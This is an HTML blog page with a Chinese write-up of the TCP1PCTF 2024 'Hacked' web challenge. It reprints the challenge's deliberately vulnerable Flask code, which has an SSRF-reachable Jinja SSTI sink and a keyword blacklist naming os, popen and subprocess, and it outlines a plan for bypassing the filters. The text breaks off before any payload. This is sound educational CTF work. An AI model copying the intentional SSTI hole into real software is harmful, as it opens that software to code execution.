@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="后来没时间看Hacked v2了（悲） 先看配置文件 # Use the official Python image as the base image FROM python:3.8-slim # Set environment variables for Flask ENV PYTHONDONT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP1PCTF 2024 Web Hacked 单题wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="后来没时间看Hacked v2了（悲） 先看配置文件 # Use the official Python image as the base image FROM python:3.8-slim # Set environment variables for Flask ENV PYTHONDONT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18461268/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18461268/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18461268/03.png">
+<meta property="article:published_time" content="2024-10-12T11:37:00.000Z">
+<meta property="article:modified_time" content="2024-10-12T11:37:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18461268/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>TCP1PCTF 2024 Web Hacked 单题wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-10-07-ironctf-2024-web-eics1-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&text=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&is_video=false&description=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TCP1PCTF 2024 Web Hacked 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&title=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&name=TCP1PCTF 2024 Web Hacked 单题wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/&t=TCP1PCTF 2024 Web Hacked 单题wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87check-forbidden-input%E6%A3%80%E6%B5%8B"><span class="toc-number">1.1.</span> <span class="toc-text">通过check_forbidden_input检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8URL%E5%89%8D%E9%9D%A2%E5%8A%A0http-daffa-info"><span class="toc-number">1.2.</span> <span class="toc-text">在URL前面加http:&#x2F;&#x2F;daffa.info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E4%BB%A5list-endpoints%E4%B8%AD%E7%9A%84%E5%85%83%E7%B4%A0%E4%B9%8B%E4%B8%80%E7%BB%93%E6%9D%9F"><span class="toc-number">1.3.</span> <span class="toc-text">URL以list_endpoints中的元素之一结束</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87is-safe-url%E6%A3%80%E6%B5%8B%EF%BC%88%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">通过is_safe_url检测（黑名单）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">2.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E5%8F%8C%E9%87%8D%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">URL双重编码绕过</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        TCP1PCTF 2024 Web Hacked 单题wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-12T11:37:00.000Z" class="dt-published" itemprop="datePublished">2024-10-12</time>
+        
+        (Updated: <time datetime="2024-10-12T11:37:00.000Z" class="dt-updated" itemprop="dateModified">2024-10-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>后来没时间看Hacked v2了（悲）</p>
+<p>先看配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Use the official Python image as the base image</span><br><span class="line">FROM python:3.8-slim</span><br><span class="line"></span><br><span class="line"># Set environment variables for Flask</span><br><span class="line">ENV PYTHONDONTWRITEBYTECODE 1</span><br><span class="line">ENV PYTHONUNBUFFERED 1</span><br><span class="line"></span><br><span class="line"># Set the working directory in the container</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># Copy the requirements file and install dependencies</span><br><span class="line">COPY requirements.txt /app/</span><br><span class="line">RUN pip install --no-cache-dir -r requirements.txt</span><br><span class="line"></span><br><span class="line"># Copy and move flag</span><br><span class="line">COPY flag.txt /app/</span><br><span class="line">RUN mv flag.txt /$(cat /dev/urandom | tr -dc &#x27;a-z0-9&#x27; | fold -w 8 | head -n 1).txt</span><br><span class="line"></span><br><span class="line"># Copy source code</span><br><span class="line">COPY application /app/</span><br><span class="line"></span><br><span class="line"># Expose the port that the app will run on</span><br><span class="line">EXPOSE 1337</span><br><span class="line"></span><br><span class="line"># Start the Flask application</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>注意到flag在根目录中的一个文件名随机的文件里</p>
+<p>看附件app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, Response, jsonify, redirect, url_for, render_template_string, abort</span><br><span class="line">from util import is_from_localhost, proxy_req</span><br><span class="line">import random, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># I BLACKLIST EVERY CHAR :)</span><br><span class="line"></span><br><span class="line">blacklist = [&quot;debug&quot;, &quot;args&quot;, &quot;headers&quot;, &quot;cookies&quot;, &quot;environ&quot;, &quot;values&quot;, &quot;query&quot;,</span><br><span class="line">    &quot;data&quot;, &quot;form&quot;, &quot;os&quot;, &quot;system&quot;, &quot;popen&quot;, &quot;subprocess&quot;, &quot;globals&quot;, &quot;locals&quot;,</span><br><span class="line">    &quot;self&quot;, &quot;lipsum&quot;, &quot;cycler&quot;, &quot;joiner&quot;, &quot;namespace&quot;, &quot;init&quot;, &quot;join&quot;, &quot;decode&quot;,</span><br><span class="line">    &quot;module&quot;, &quot;config&quot;, &quot;builtins&quot;, &quot;import&quot;, &quot;application&quot;, &quot;getitem&quot;, &quot;read&quot;,</span><br><span class="line">    &quot;getitem&quot;, &quot;mro&quot;, &quot;endwith&quot;, &quot; &quot;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;, &quot;_&quot;, &quot;&#123;&#123;&quot;, &quot;&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;\\&quot;, &quot;x&quot;]</span><br><span class="line"></span><br><span class="line">from flask import request, abort</span><br><span class="line"></span><br><span class="line">def check_forbidden_input(func):</span><br><span class="line">    def wrapper(*args, **kwargs):</span><br><span class="line">        for header, value in request.headers.items():</span><br><span class="line">            for forbidden_str in blacklist:</span><br><span class="line">                if forbidden_str in value:</span><br><span class="line">                    abort(400, f&quot;Forbidden: &#x27;&#123;forbidden_str&#125;&#x27; not allowed in &#123;header&#125; header&quot;)</span><br><span class="line"></span><br><span class="line">        for key, value in request.args.items():</span><br><span class="line">            for forbidden_str in blacklist:</span><br><span class="line">                if forbidden_str in value:</span><br><span class="line">                    abort(400, f&quot;Forbidden: &#x27;&#123;forbidden_str&#125;&#x27; not allowed in URL parameter &#x27;&#123;key&#125;&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            if request.is_json:</span><br><span class="line">                json_data = request.get_json()</span><br><span class="line">                if json_data:</span><br><span class="line">                    for key, value in json_data.items():</span><br><span class="line">                        for forbidden_str in blacklist:</span><br><span class="line">                            if forbidden_str in value:</span><br><span class="line">                                abort(400, f&quot;Forbidden: &#x27;&#123;forbidden_str&#125;&#x27; not allowed in JSON request body key &#x27;&#123;key&#125;&#x27;&quot;)</span><br><span class="line">            else:</span><br><span class="line">                body = request.get_data(as_text=True)</span><br><span class="line">                for forbidden_str in blacklist:</span><br><span class="line">                    if forbidden_str in body:</span><br><span class="line">                        abort(400, f&quot;Forbidden: &#x27;&#123;forbidden_str&#125;&#x27; not allowed in request body&quot;)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">        # Call the original function if checks pass</span><br><span class="line">        return func(*args, **kwargs)</span><br><span class="line">    return wrapper</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">@check_forbidden_input</span><br><span class="line">def proxy():</span><br><span class="line">    url = request.args.get(&#x27;url&#x27;)</span><br><span class="line"></span><br><span class="line">    list_endpoints = [</span><br><span class="line">        &#x27;/about/&#x27;,</span><br><span class="line">        &#x27;/portfolio/&#x27;,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    if not url:</span><br><span class="line">        endpoint = random.choice(list_endpoints)</span><br><span class="line">        # Construct the URL with query parameter</span><br><span class="line">        return redirect(f&#x27;/?url=&#123;endpoint&#125;&#x27;)</span><br><span class="line">    </span><br><span class="line">    target_url = &quot;http://daffa.info&quot; + url</span><br><span class="line"></span><br><span class="line">    if target_url.startswith(&quot;http://daffa.info&quot;) and any(target_url.endswith(endpoint) for endpoint in list_endpoints):</span><br><span class="line">        response, headers = proxy_req(target_url)</span><br><span class="line"></span><br><span class="line">        return Response(response.content, response.status_code, headers.items())</span><br><span class="line">    else:</span><br><span class="line">        abort(403)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/secret&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">@is_from_localhost</span><br><span class="line">def dev_secret():</span><br><span class="line">    admin = &quot;daffainfo&quot;</span><br><span class="line">    css_url = url_for(&#x27;static&#x27;, filename=&#x27;css/main.css&#x27;)</span><br><span class="line"></span><br><span class="line">    if request.args.get(&#x27;admin&#x27;) is not None:</span><br><span class="line">        admin = request.args.get(&#x27;admin&#x27;)</span><br><span class="line"></span><br><span class="line">    if not admin:</span><br><span class="line">        abort(403)</span><br><span class="line"></span><br><span class="line">    template = &#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt;</span><br><span class="line">        &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">            &lt;title&gt;Admin Notes Preview&lt;/title&gt;</span><br><span class="line">            &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#125;&quot;&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">            &lt;h1&gt;NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!&lt;/h1&gt;</span><br><span class="line">            &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">                &lt;label for=&quot;admin&quot;&gt;Admin:&lt;/label&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; id=&quot;admin&quot; name=&quot;admin&quot; required&gt;</span><br><span class="line">                &lt;br&gt;</span><br><span class="line">                &lt;input type=&quot;submit&quot; value=&quot;Preview!&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;p&gt;Admin: &#123;&#125;&lt;span id=&quot;adminName&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">        &lt;/html&gt;&#x27;&#x27;&#x27;.format(css_url, admin)</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">app.run(host=&#x27;0.0.0.0&#x27;, port=1337)</span><br></pre></td></tr></table></figure>
+
+<p>utils.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from flask import request, abort</span><br><span class="line">import functools, requests</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line"></span><br><span class="line">RESTRICTED_URLS = [&#x27;localhost&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line"></span><br><span class="line">def is_safe_url(url):</span><br><span class="line">    parsed_url = urlparse(url)</span><br><span class="line">    hostname = parsed_url.hostname</span><br><span class="line">    if not hostname:</span><br><span class="line">        return False</span><br><span class="line">    for restricted_url in RESTRICTED_URLS:</span><br><span class="line">        if restricted_url in hostname:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def is_from_localhost(func):</span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def check_ip(*args, **kwargs):</span><br><span class="line">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class="line">            return abort(403)</span><br><span class="line">        return func(*args, **kwargs)</span><br><span class="line">    return check_ip</span><br><span class="line"></span><br><span class="line">def proxy_req(url):</span><br><span class="line">    method = request.method</span><br><span class="line">    headers = &#123;</span><br><span class="line">        key: value for key, value in request.headers if key.lower() in [&#x27;x-csrf-token&#x27;, &#x27;cookie&#x27;, &#x27;referer&#x27;]</span><br><span class="line">    &#125;</span><br><span class="line">    data = request.get_data()</span><br><span class="line"></span><br><span class="line">    response = requests.request(</span><br><span class="line">        method,</span><br><span class="line">        url,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=data,</span><br><span class="line">        verify=False,</span><br><span class="line">        allow_redirects=False  # Prevent following redirects</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    if not is_safe_url(url) or not is_safe_url(response.url):</span><br><span class="line">        return abort(403)</span><br><span class="line">    </span><br><span class="line">    return response, headers</span><br></pre></td></tr></table></figure>
+
+<p>浅读了一下代码。&#x2F;secret中的SSTI sink很明显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  template = &#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt;</span><br><span class="line">      &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">          &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">          &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">          &lt;title&gt;Admin Notes Preview&lt;/title&gt;</span><br><span class="line">          &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#125;&quot;&gt;</span><br><span class="line">      &lt;/head&gt;</span><br><span class="line">      &lt;body&gt;</span><br><span class="line">          &lt;h1&gt;NOTES!! ONLY ADMIN CAN ACCESS THIS AREA!&lt;/h1&gt;</span><br><span class="line">          &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">              &lt;label for=&quot;admin&quot;&gt;Admin:&lt;/label&gt;</span><br><span class="line">              &lt;input type=&quot;text&quot; id=&quot;admin&quot; name=&quot;admin&quot; required&gt;</span><br><span class="line">              &lt;br&gt;</span><br><span class="line">              &lt;input type=&quot;submit&quot; value=&quot;Preview!&quot;&gt;</span><br><span class="line">          &lt;/form&gt;</span><br><span class="line">          &lt;p&gt;Admin: &#123;&#125;&lt;span id=&quot;adminName&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">      &lt;/body&gt;</span><br><span class="line">      &lt;/html&gt;&#x27;&#x27;&#x27;.format(css_url, admin)</span><br><span class="line">return render_template_string(template)</span><br></pre></td></tr></table></figure>
+
+<p>看到经典SSTI连招：format字符串加render_template_string，可以确诊是jinja SSTI了</p>
+<p>但是注意到&#x2F;secret路由有一个is_from_localhost的检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def is_from_localhost(func):</span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def check_ip(*args, **kwargs):</span><br><span class="line">        if request.remote_addr != &#x27;127.0.0.1&#x27;:</span><br><span class="line">            return abort(403)</span><br><span class="line">        return func(*args, **kwargs)</span><br><span class="line">    return check_ip</span><br></pre></td></tr></table></figure>
+
+<p>看了一下绕不了，只能靠SSRF打进来</p>
+<p>先打通SSRF，在通过传admin参数打SSTI</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>注意到根路由有个很明显的功能可以实现SSRF————访问用户传入的URL。过滤要求：</p>
+<ul>
+<li>通过check_forbidden_input检测（黑名单）</li>
+<li>在URL前面加<a target="_blank" rel="noopener" href="http://daffa.info/">http://daffa.info</a></li>
+<li>URL以list_endpoints中的元素之一结束</li>
+<li>通过is_safe_url检测（黑名单）</li>
+<li>禁止重定向（allow_redirects&#x3D;False）</li>
+</ul>
+<p>一个一个来。</p>
+<h3 id="通过check-forbidden-input检测"><a href="#通过check-forbidden-input检测" class="headerlink" title="通过check_forbidden_input检测"></a>通过check_forbidden_input检测</h3><p>首先要通过check_forbidden_input检测，这里可以把http包精简一下，把黑名单上的不必要的参数去掉。</p>
+<p>黑名单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [&quot;debug&quot;, &quot;args&quot;, &quot;headers&quot;, &quot;cookies&quot;, &quot;environ&quot;, &quot;values&quot;, &quot;query&quot;,</span><br><span class="line">    &quot;data&quot;, &quot;form&quot;, &quot;os&quot;, &quot;system&quot;, &quot;popen&quot;, &quot;subprocess&quot;, &quot;globals&quot;, &quot;locals&quot;,</span><br><span class="line">    &quot;self&quot;, &quot;lipsum&quot;, &quot;cycler&quot;, &quot;joiner&quot;, &quot;namespace&quot;, &quot;init&quot;, &quot;join&quot;, &quot;decode&quot;,</span><br><span class="line">    &quot;module&quot;, &quot;config&quot;, &quot;builtins&quot;, &quot;import&quot;, &quot;application&quot;, &quot;getitem&quot;, &quot;read&quot;,</span><br><span class="line">    &quot;getitem&quot;, &quot;mro&quot;, &quot;endwith&quot;, &quot; &quot;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;, &quot;_&quot;, &quot;&#123;&#123;&quot;, &quot;&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;\\&quot;, &quot;x&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>http包如下：</p>
